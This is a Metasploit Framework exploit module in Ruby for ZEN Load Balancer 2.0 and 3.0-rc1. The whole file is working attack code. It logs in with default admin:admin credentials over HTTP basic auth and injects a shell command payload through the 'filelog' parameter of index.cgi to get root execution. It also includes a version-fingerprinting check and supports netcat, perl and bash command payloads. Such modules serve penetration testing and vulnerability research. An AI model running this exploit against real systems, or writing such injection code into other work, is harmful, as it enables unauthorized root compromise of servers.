# This file is part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see the Metasploit
# Framework web site for more information on licensing and terms of use.
#   http://metasploit.com/framework/
##

require &#039;msf/core&#039;

class Metasploit3 < Msf::Exploit::Remote
  Rank = ExcellentRanking

  include Msf::Exploit::Remote::HttpClient

  def initialize(info={})
    super(update_info(info,
      &#039;Name&#039;           => "ZEN Load Balancer Filelog Command Execution",
      &#039;Description&#039;    => %q{
        This module exploits a vulnerability in ZEN Load Balancer
        version 2.0 and 3.0-rc1 which could be abused to allow authenticated users
        to execute arbitrary code under the context of the &#039;root&#039; user.
        The &#039;content2-2.cgi&#039; file uses user controlled data from the &#039;filelog&#039;
        parameter within backticks.
      },
      &#039;License&#039;        => MSF_LICENSE,
      &#039;Author&#039;         =>
        [
          &#039;Brendan Coles <bcoles[at]gmail.com>&#039; # Discovery and exploit
        ],
      &#039;References&#039;     =>
        [
          [&#039;URL&#039;, &#039;http://itsecuritysolutions.org/2012-09-21-ZEN-Load-Balancer-v2.0-and-v3.0-rc1-multiple-vulnerabilities/&#039;]
        ],
      &#039;DefaultOptions&#039;  =>
        {
          &#039;ExitFunction&#039; => &#039;none&#039;
        },
      &#039;Platform&#039;       => &#039;unix&#039;,
      &#039;Arch&#039;           => ARCH_CMD,
      &#039;Payload&#039;        =>
        {
          &#039;Space&#039;       => 1024,
          &#039;BadChars&#039;    => "\x00",
          &#039;DisableNops&#039; => true,
          &#039;Compat&#039;      =>
            {
              &#039;PayloadType&#039; => &#039;cmd&#039;,
              &#039;RequiredCmd&#039; => &#039;generic netcat-e perl bash&#039;,
            }
        },
      &#039;Targets&#039;        =>
        [
          [&#039;Automatic Targeting&#039;, { &#039;auto&#039; => true }]
        ],
      &#039;Privileged&#039;     => true,
      &#039;DisclosureDate&#039; => "Sep 14 2012",
      &#039;DefaultTarget&#039;  => 0))

    register_options(
      [
        Opt::RPORT(444),
        OptBool.new(&#039;SSL&#039;, [true, &#039;Use SSL&#039;, true]),
        OptString.new(&#039;USERNAME&#039;, [true, &#039;The username for the application&#039;, &#039;admin&#039;]),
        OptString.new(&#039;PASSWORD&#039;, [true, &#039;The password for the application&#039;, &#039;admin&#039;])
      ], self.class)
  end

  def check

    @peer = "#{rhost}:#{rport}"

    # retrieve software version from config file
    print_status("#{@peer} - Sending check")
    begin
      res = send_request_cgi({
        &#039;uri&#039; => &#039;/config/global.conf&#039;
      })

      if    res and res.code == 200 and res.body =~ /#version ZEN\s+\$version=\"(2|3\.0\-rc1)/
        return Exploit::CheckCode::Appears
      elsif res and res.code == 200 and res.body =~ /zenloadbalancer/
        return Exploit::CheckCode::Detected
      end

    rescue ::Rex::ConnectionRefused, ::Rex::HostUnreachable, ::Rex::ConnectionTimeout
      print_error("#{@peer} - Connection failed")
    end
    return Exploit::CheckCode::Unknown

  end

  def exploit

    @peer = "#{rhost}:#{rport}"
    user  = datastore[&#039;USERNAME&#039;]
    pass  = datastore[&#039;PASSWORD&#039;]
    auth  = Rex::Text.encode_base64("#{user}:#{pass}")
    cmd   = Rex::Text.uri_encode(";#{payload.encoded}&")
    lines = rand(100) + 1

    # send payload
    print_status("#{@peer} - Sending payload (#{payload.encoded.length} bytes)")
    begin
      res = send_request_cgi({
        &#039;uri&#039;     => "/index.cgi?nlines=#{lines}&action=See+logs&id=2-2&filelog=#{cmd}",
        &#039;headers&#039; =>
          {
            &#039;Authorization&#039; => "Basic #{auth}"
          }
      }, 25)
    rescue ::Rex::ConnectionRefused, ::Rex::HostUnreachable, ::Rex::ConnectionTimeout
      fail_with(Exploit::Failure::Unreachable, &#039;Connection failed&#039;)
    rescue
      fail_with(Exploit::Failure::Unknown, &#039;Sending payload failed&#039;)
    end

    if res and res.code == 401
      fail_with(Exploit::Failure::NoAccess, &#039;Authentication failed&#039;)
    end

  end

end



